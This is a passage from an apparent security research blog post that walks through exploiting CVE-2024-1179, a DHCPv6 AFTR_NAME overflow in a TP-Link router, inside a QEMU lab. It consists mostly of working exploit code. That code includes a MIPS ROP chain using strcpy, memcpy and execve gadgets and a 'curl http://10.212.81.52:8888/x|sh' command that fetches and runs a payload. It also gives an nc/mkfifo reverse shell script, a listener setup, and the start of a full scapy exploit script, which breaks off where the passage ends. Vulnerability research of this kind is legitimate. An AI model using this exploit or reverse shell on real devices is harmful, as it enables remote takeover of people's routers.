</span></span><span style=display:flex><span>p2<span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;b&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>16</span> 
</span></span><span style=display:flex><span>p2<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;-c</span><span style=color:#ae81ff>\x00\x00</span><span style=color:#e6db74>&#39;</span> <span style=color:#75715e>## -c strings</span>
</span></span><span style=display:flex><span>p2<span style=color:#f92672>+=</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;z&#39;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>84</span><span style=color:#f92672>-</span>len(p2)<span style=color:#f92672>-</span><span style=color:#ae81ff>0x4</span><span style=color:#f92672>-</span><span style=color:#ae81ff>0x4</span>)
</span></span><span style=display:flex><span>p2<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;cafe&#39;</span> <span style=color:#75715e>### 3 - next pc/ra --&gt; next gadget</span>
</span></span><span style=display:flex><span>p2<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;babe&#39;</span>
</span></span><span style=display:flex><span>p2<span style=color:#f92672>+=</span> p32(w_region<span style=color:#f92672>+</span><span style=color:#ae81ff>0x50</span>) <span style=color:#75715e># destination pointer</span>
</span></span><span style=display:flex><span>p2<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;c&#39;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>300</span><span style=color:#f92672>-</span>len(p1)<span style=color:#f92672>-</span>len(p2))  <span style=color:#75715e>## padding (not necessary ath this moment)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> payload <span style=color:#f92672>+</span> p1 <span style=color:#f92672>+</span> p2
</span></span><span style=display:flex><span>aftr_name_option <span style=color:#f92672>=</span> code <span style=color:#f92672>+</span> (len(payload))<span style=color:#f92672>.</span>to_bytes(<span style=color:#ae81ff>2</span>, byteorder<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;big&#39;</span>) <span style=color:#f92672>+</span> payload
</span></span></code></pre></div><p>Inspecting GDB, we can see that we have effectively written <code>-c</code> strings and have more bytes padding left.</p><p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031152528.png><figcaption><h4></h4></figcaption></figure><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031153121.png><figcaption><h4></h4></figcaption></figure></p><p>Now we have everything we need to use the <code>execve</code> gadgets. But there is one more thing left.
Let&rsquo;s check the <code>execve</code> gadgets again:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>gef<span style=color:#f92672>&gt;</span> x<span style=color:#f92672>/</span><span style=color:#ae81ff>8</span>i <span style=color:#ae81ff>0x40a8b6</span><span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0x40a8b7</span><span style=color:#f92672>:</span>	lw	a2,<span style=color:#ae81ff>56</span>(sp)
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0x40a8b9</span><span style=color:#f92672>:</span>	lw	a0,<span style=color:#ae81ff>136</span>(sp)
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0x40a8bb</span><span style=color:#f92672>:</span>	jal	<span style=color:#ae81ff>0x419211</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0x40a8bf</span><span style=color:#f92672>:</span>	addiu	a1,sp,<span style=color:#ae81ff>44</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0x40a8c1</span><span style=color:#f92672>:</span>	jal	<span style=color:#ae81ff>0x4196e1</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0x40a8c5</span><span style=color:#f92672>:</span>	nop
</span></span></code></pre></div><p><code>a0</code> will be populated from stack offset 136. With our current padding, this stack offset is out of control.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031153602.png><figcaption><h4></h4></figcaption></figure><p>We need to increase the padding length. After some trial and error, we noticed that there is a maximum padding length that can still trigger the segfault at <code>cafe</code> address that is under our control as we saw earlier. This maximum length is <code>360</code>. If we use a padding length greater than this value, the program still crash and trigger segfault, but at a location that is not under our control (probably into one of the library function).
Let&rsquo;s use this maximum padding length(<code>360</code>) and see if our <code>execve</code> gadget <code>a0</code> argument can be a value that we control:</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031154436.png><figcaption><h4></h4></figcaption></figure><p>That is cool, we are so lucky.</p><p>Now we can append our <code>execve</code> gadget to our ROP chain.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>
</span></span><span style=display:flex><span>gadget3 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x40a8b6</span><span style=color:#f92672>+</span><span style=color:#ae81ff>1</span> <span style=color:#75715e># execve</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p2<span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;b&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>16</span>
</span></span><span style=display:flex><span>p2<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;-c</span><span style=color:#ae81ff>\x00\x00</span><span style=color:#e6db74>&#39;</span> <span style=color:#75715e>## -c strings</span>
</span></span><span style=display:flex><span>p2<span style=color:#f92672>+=</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;z&#39;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>84</span><span style=color:#f92672>-</span>len(p2)<span style=color:#f92672>-</span><span style=color:#ae81ff>0x4</span><span style=color:#f92672>-</span><span style=color:#ae81ff>0x4</span>)
</span></span><span style=display:flex><span>p2<span style=color:#f92672>+=</span> p32(gadget3) <span style=color:#75715e>### 3 - next pc/ra --&gt; next gadget</span>
</span></span><span style=display:flex><span>p2<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;babe&#39;</span>
</span></span><span style=display:flex><span>p2<span style=color:#f92672>+=</span> p32(w_region<span style=color:#f92672>+</span><span style=color:#ae81ff>0x50</span>) <span style=color:#75715e># destination pointer</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p3<span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;c&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>36</span>
</span></span><span style=display:flex><span>p3<span style=color:#f92672>+=</span> p32(binsh_addr) <span style=color:#f92672>+</span> p32(w_region<span style=color:#f92672>+</span><span style=color:#ae81ff>0x50</span>) <span style=color:#f92672>+</span> p32(w_region) <span style=color:#75715e># a1 = [&#39;/bin/sh&#39;, &#39;-c&#39;, command, a2=NULL]</span>
</span></span><span style=display:flex><span>p3<span style=color:#f92672>+=</span> p32(<span style=color:#ae81ff>0x0</span>) <span style=color:#75715e># a2 = NULL = envp</span>
</span></span><span style=display:flex><span>p3<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;c&#39;</span><span style=color:#f92672>*</span>(<span style=color:#ae81ff>128</span><span style=color:#f92672>-</span>len(p3))
</span></span><span style=display:flex><span>p3<span style=color:#f92672>+=</span> p32(binsh_addr) <span style=color:#75715e>#a0 = &#39;/bin/sh&#39;</span>
</span></span><span style=display:flex><span>p3<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;c&#39;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>358</span><span style=color:#f92672>-</span>len(p3)<span style=color:#f92672>-</span>len(p2) <span style=color:#f92672>-</span>len(p1))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> payload <span style=color:#f92672>+</span> p1 <span style=color:#f92672>+</span> p2 <span style=color:#f92672>+</span> p3
</span></span><span style=display:flex><span>aftr_name_option <span style=color:#f92672>=</span> code <span style=color:#f92672>+</span> (len(payload))<span style=color:#f92672>.</span>to_bytes(<span style=color:#ae81ff>2</span>, byteorder<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;big&#39;</span>) <span style=color:#f92672>+</span> payload
</span></span></code></pre></div><p>Inspecting in GDB before the execution, we have:</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031155626.png><figcaption><h4></h4></figcaption></figure><p>So everything is OK to execute our command. After the execution, we have the following on the qemu VM.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031155758.png><figcaption><h4></h4></figcaption></figure><p>Great. This means we have our remote command execution. But if we try to change the command we trigger a <code>Bus error</code> issue in GDB. After digging into it, we found that this is caused by one of the branch delay slot that we are not handling very well.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#f92672>-&gt;</span> <span style=color:#ae81ff>0x40c4bb</span> e870 <span style=color:#f92672>&lt;</span>NO_SYMBOL<span style=color:#f92672>&gt;</span> jrc ra
</span></span><span style=display:flex><span>	<span style=color:#ae81ff>0x40c4bd</span> <span style=color:#ae81ff>5e41</span> <span style=color:#f92672>&lt;</span>NO_SYMBOL<span style=color:#f92672>&gt;</span> sltiu a2, <span style=color:#ae81ff>112</span> Maybe delay<span style=color:#f92672>-</span>slot
</span></span></code></pre></div><p>This branch delay slot needed <code>a2</code> to be a valid address. After the fix we have the following working script (see the comments for explanation):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>binsh_addr <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0041317c</span>
</span></span><span style=display:flex><span>w_region <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x42a600</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gadget1 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0040c4ac</span><span style=color:#f92672>+</span><span style=color:#ae81ff>1</span> <span style=color:#75715e>## strcpy</span>
</span></span><span style=display:flex><span>gadget2 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x40c396</span><span style=color:#f92672>+</span><span style=color:#ae81ff>1</span> <span style=color:#75715e># memcpy</span>
</span></span><span style=display:flex><span>gadget3 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x40a8b6</span><span style=color:#f92672>+</span><span style=color:#ae81ff>1</span> <span style=color:#75715e># execve</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>417</span> <span style=color:#f92672>+</span> p32(w_region<span style=color:#f92672>+</span><span style=color:#ae81ff>0x80</span>) <span style=color:#f92672>+</span> p32(gadget1) <span style=color:#75715e># here s0 at offset 417 need to be valid address</span>
</span></span><span style=display:flex><span>p1 <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>24</span>
</span></span><span style=display:flex><span>p1<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;commandhophop1hiphopalmpostsecurefffffffffffffffffffff &#39;</span> <span style=color:#75715e>## our command (source content)</span>
</span></span><span style=display:flex><span>p1<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>*</span>(<span style=color:#ae81ff>120</span><span style=color:#f92672>-</span>len(p1))
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>-&gt; 0x40c4bb e870 &lt;NO_SYMBOL&gt; jrc ra
</span></span></span><span style=display:flex><span><span style=color:#e6db74>0x40c4bd 5e41 &lt;NO_SYMBOL&gt; sltiu a2, 112 Maybe delay-slot
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p1<span style=color:#f92672>+=</span> p32(w_region<span style=color:#f92672>+</span><span style=color:#ae81ff>0x70</span>) <span style=color:#75715e>## Fix delay-slot (a2 need to be a valid pointer to avoid Bus error)</span>
</span></span><span style=display:flex><span>p1<span style=color:#f92672>+=</span> p32(gadget2) <span style=color:#75715e># ## next pc/ra --&gt; next gadget</span>
</span></span><span style=display:flex><span>p1<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>*</span>(<span style=color:#ae81ff>132</span><span style=color:#f92672>-</span>len(p1))
</span></span><span style=display:flex><span>p1<span style=color:#f92672>+=</span> p32(w_region) <span style=color:#75715e># destination pointer</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p2<span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;b&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>16</span> <span style=color:#75715e>## If we choose b for exemple we will face the 0x2e (.) aftr_name, to avoid jsut extend the length</span>
</span></span><span style=display:flex><span>p2<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;-c</span><span style=color:#ae81ff>\x00\x00</span><span style=color:#e6db74>&#39;</span> <span style=color:#75715e>## -c strings</span>
</span></span><span style=display:flex><span>p2<span style=color:#f92672>+=</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;z&#39;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>84</span><span style=color:#f92672>-</span>len(p2)<span style=color:#f92672>-</span><span style=color:#ae81ff>0x4</span><span style=color:#f92672>-</span><span style=color:#ae81ff>0x4</span>)
</span></span><span style=display:flex><span>p2<span style=color:#f92672>+=</span> p32(gadget3) <span style=color:#75715e>### 3 - next pc/ra --&gt; next gadget</span>
</span></span><span style=display:flex><span>p2<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;babe&#39;</span>
</span></span><span style=display:flex><span>p2<span style=color:#f92672>+=</span> p32(w_region<span style=color:#f92672>+</span><span style=color:#ae81ff>0x50</span>) <span style=color:#75715e># destination pointer</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p3<span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;c&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>36</span>
</span></span><span style=display:flex><span>p3<span style=color:#f92672>+=</span> p32(binsh_addr) <span style=color:#f92672>+</span> p32(w_region<span style=color:#f92672>+</span><span style=color:#ae81ff>0x50</span>) <span style=color:#f92672>+</span> p32(w_region) <span style=color:#75715e># a1 = [&#39;/bin/sh&#39;, &#39;-c&#39;, command, a2=NULL]</span>
</span></span><span style=display:flex><span>p3<span style=color:#f92672>+=</span> p32(<span style=color:#ae81ff>0x0</span>) <span style=color:#75715e># a2 = NULL = envp</span>
</span></span><span style=display:flex><span>p3<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;c&#39;</span><span style=color:#f92672>*</span>(<span style=color:#ae81ff>128</span><span style=color:#f92672>-</span>len(p3))
</span></span><span style=display:flex><span>p3<span style=color:#f92672>+=</span> p32(binsh_addr) <span style=color:#75715e>#a0 = &#39;/bin/sh&#39;</span>
</span></span><span style=display:flex><span>p3<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;c&#39;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>358</span><span style=color:#f92672>-</span>len(p3)<span style=color:#f92672>-</span>len(p2) <span style=color:#f92672>-</span>len(p1))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> payload <span style=color:#f92672>+</span> p1 <span style=color:#f92672>+</span> p2 <span style=color:#f92672>+</span> p3
</span></span><span style=display:flex><span>aftr_name_option <span style=color:#f92672>=</span> code <span style=color:#f92672>+</span> (len(payload))<span style=color:#f92672>.</span>to_bytes(<span style=color:#ae81ff>2</span>, byteorder<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;big&#39;</span>) <span style=color:#f92672>+</span> payload
</span></span></code></pre></div><p>And in the VM after the execution, we have:</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031165744.png><figcaption><h4></h4></figcaption></figure><p>Perfect ! the <code>.</code> is there because the binary wrote it there to conform with the <code>AFTR_NAME</code>. This will not cause any damage to our exploitation , we can handle it easily.
Now the question is what command we will run. As we want a reverse shell and that we have a tiny space before the <code>.</code> we will just execute a command to download a bash file that will contain the final payload and execute it. We can do it simply with curl:
<code>curl http://addresse:port/x|sh;#</code>
The <code>#</code> is there to filter the rest of command so that it will be considered as comment and will not be executed.
On the sub-net we created our host address is <code>10.212.81.52</code> and we choose to serve the bash file on port <code>8888</code>. So our command is: <code>curl http://10.212.81.52:8888/x|sh;#</code></p><pre tabindex=0><code>br0: flags=4419&lt;UP,BROADCAST,RUNNING,PROMISC,MULTICAST&gt;  mtu 1500
        inet 10.212.81.52  netmask 255.255.0.0  broadcast 10.212.255.255
        inet6 fe80::542b:76ce:631b:36ce  prefixlen 64  scopeid 0x20&lt;link&gt;
        ether da:30:2c:48:59:a8  txqueuelen 1000  (Ethernet)
        RX packets 2477143  bytes 1947827351 (1.9 GB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1312938  bytes 229493321 (229.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</code></pre><p>The python script is now:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>.</span>
</span></span><span style=display:flex><span><span style=color:#f92672>.</span>
</span></span><span style=display:flex><span><span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>p1 <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>24</span>
</span></span><span style=display:flex><span>p1<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;curl http://10.212.81.52:8888/x|sh;#&#39;</span> <span style=color:#75715e>## our command (source content)</span>
</span></span><span style=display:flex><span>p1<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>*</span>(<span style=color:#ae81ff>120</span><span style=color:#f92672>-</span>len(p1))
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>-&gt; 0x40c4bb e870 &lt;NO_SYMBOL&gt; jrc ra
</span></span></span><span style=display:flex><span><span style=color:#e6db74>0x40c4bd 5e41 &lt;NO_SYMBOL&gt; sltiu a2, 112 Maybe delay-slot
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>p1<span style=color:#f92672>+=</span> p32(w_region<span style=color:#f92672>+</span><span style=color:#ae81ff>0x70</span>) <span style=color:#75715e>## Fix delay-slot (a2 need to be a valid pointer to avoid Bus error)</span>
</span></span><span style=display:flex><span>p1<span style=color:#f92672>+=</span> p32(gadget2) <span style=color:#75715e># ## next pc/ra --&gt; next gadget</span>
</span></span><span style=display:flex><span>p1<span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>*</span>(<span style=color:#ae81ff>132</span><span style=color:#f92672>-</span>len(p1))
</span></span><span style=display:flex><span>p1<span style=color:#f92672>+=</span> p32(w_region) <span style=color:#75715e># destination pointer</span>
</span></span><span style=display:flex><span><span style=color:#f92672>.</span>
</span></span><span style=display:flex><span><span style=color:#f92672>.</span>
</span></span><span style=display:flex><span><span style=color:#f92672>.</span>
</span></span></code></pre></div><p>And after execution:</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031174000.png><figcaption><h4></h4></figcaption></figure><p>The file that will be downloaded can be something like this:</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031172944.png><figcaption><h4></h4></figcaption></figure><p>But as <code>netcat</code> is installed, we opt for a reverse shell based on <code>mkfifo</code> which we get from <a href=https://podalirius.net/fr/articles/unix-reverse-shells-cheatsheet/#new-netcat>here</a>. We replace the redirection of stderr to stdout (<code>2>&amp;1</code>) with a redirection from socket file descriptor number 3 to stdout (<code>3>&amp;1</code>).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>mkfifo /tmp/f;nc 10.212.81.52 <span style=color:#ae81ff>4444</span> 0&lt;/tmp/f|/bin/sh -i 3&gt;&amp;1|tee /tmp/f
</span></span></code></pre></div><p>The bash file will be hosted in our host machine. So we use python HTTP server to host this file, named <code>x</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>python3 -m http.server <span style=color:#ae81ff>8888</span>
</span></span></code></pre></div><p>and then is another terminal we start a <code>netcat</code> listener:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>nc -lnvp <span style=color:#ae81ff>4444</span>
</span></span></code></pre></div><p>And boom !! We have a reverse shell !!!!</p><p>On Qemu WM side we have this.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031174844.png><figcaption><h4></h4></figcaption></figure><p>And on our host machine listener terminal:</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031174829.png><figcaption><h4></h4></figcaption></figure><p>Great. The complete exploitation script is as follows:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> scapy.all <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> scapy.layers.inet6 <span style=color:#f92672>import</span> IPv6, UDP
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> scapy.layers.dhcp6 <span style=color:#f92672>import</span> DHCP6_Solicit, DHCP6OptServerId, DHCP6OptClientId
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> time
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>br0: flags=4419&lt;UP,BROADCAST,RUNNING,PROMISC,MULTICAST&gt;  mtu 1500
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        inet 10.212.81.52  netmask 255.255.0.0  broadcast 10.212.255.255
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        inet6 fe80::542b:76ce:631b:36ce  prefixlen 64  scopeid 0x20&lt;link&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        ether da:30:2c:48:59:a8  txqueuelen 1000  (Ethernet)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        RX packets 652899  bytes 434959083 (434.9 MB)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        RX errors 0  dropped 0  overruns 0  frame 0
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        TX packets 284487  bytes 81342637 (81.3 MB)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>target_mac <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;00:11:22:33:44:55&#34;</span>  <span style=color:#75715e># qemu </span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>br0_mac <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;da:30:2c:48:59:a8&#34;</span>
</span></span><span style=display:flex><span>br0_link_local_inet6 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;fe80::542b:76ce:631b:36ce&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>filter_solicit_msg</span>(pkt):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> pkt<span style=color:#f92672>.</span>haslayer(DHCP6_Solicit) <span style=color:#f92672>and</span> pkt[Ether]<span style=color:#f92672>.</span>src <span style=color:#f92672>==</span> target_mac
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>send_dhcp6_advertise</span>(p):
</span></span><span style=display:flex><span>    <span style=color:#75715e># Set up Ethernet layer with source and destination MAC addresses</span>
</span></span><span style=display:flex><span>    src_mac <span style=color:#f92672>=</span> br0_mac  <span style=color:#75715e># Bridge interface MAC address</span>
</span></span><span style=display:flex><span>    dst_mac <span style=color:#f92672>=</span> p[Ether]<span style=color:#f92672>.</span>src  <span style=color:#75715e># Client&#39;s MAC address from original packet</span>
</span></span><span style=display:flex><span>    ethernet_layer <span style=color:#f92672>=</span> Ether(src<span style=color:#f92672>=</span>src_mac, dst<span style=color:#f92672>=</span>dst_mac)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># Set up IPv6 layer with source and destination addresses</span>
</span></span><span style=display:flex><span>    ipv6_dst <span style=color:#f92672>=</span> p[IPv6]<span style=color:#f92672>.</span>src  <span style=color:#75715e># Client&#39;s IPv6 address from original packet</span>
</span></span><span style=display:flex><span>    ipv6_src <span style=color:#f92672>=</span> br0_link_local_inet6  <span style=color:#75715e># Bridge interface link-local address</span>
</span></span><span style=display:flex><span>    ipv6_layer <span style=color:#f92672>=</span> IPv6(src<span style=color:#f92672>=</span>ipv6_src, dst<span style=color:#f92672>=</span>ipv6_dst)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># Set up UDP layer with DHCPv6 ports</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Port 547: Server port, Port 546: Client port</span>
</span></span><span style=display:flex><span>    udp_layer <span style=color:#f92672>=</span> UDP(sport<span style=color:#f92672>=</span><span style=color:#ae81ff>547</span>, dport<span style=color:#f92672>=</span><span style=color:#ae81ff>546</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># Extract client DUID and transaction ID from original Solicit message</span>
</span></span><span style=display:flex><span>    client_duid <span style=color:#f92672>=</span> p[DHCP6OptClientId]<span style=color:#f92672>.</span>duid
</span></span><span style=display:flex><span>    trid <span style=color:#f92672>=</span> p[DHCP6_Solicit]<span style=color:#f92672>.</span>trid
</span></span><span style=display:flex><span>    dhcp6_advertise <span style=color:#f92672>=</span> DHCP6_Advertise(trid<span style=color:#f92672>=</span>trid)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># Create DHCPv6 options</span>
</span></span><span style=display:flex><span>    client_id <span style=color:#f92672>=</span> DHCP6OptClientId(duid<span style=color:#f92672>=</span>client_duid)  <span style=color:#75715e># Client Identifier option</span>
</span></span><span style=display:flex><span>    server_id <span style=color:#f92672>=</span> DHCP6OptServerId(duid<span style=color:#f92672>=</span>DUID_LLT(hwtype<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>, lladdr<span style=color:#f92672>=</span>src_mac))  <span style=color:#75715e># Server Identifier option</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># AFTR_NAME option</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># &gt;&gt;&gt; hex(63) == &#39;0x3f&#39;</span>
</span></span><span style=display:flex><span>    code <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00\x40</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># aftr_name: size + string + size + string + ... +</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#payload = (b&#39;\x30&#39; + b&#39;a&#39; * 0x30) * 10</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    binsh_addr <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0041317c</span>
</span></span><span style=display:flex><span>    w_region <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x42a600</span>
</span></span><span style=display:flex><span>    
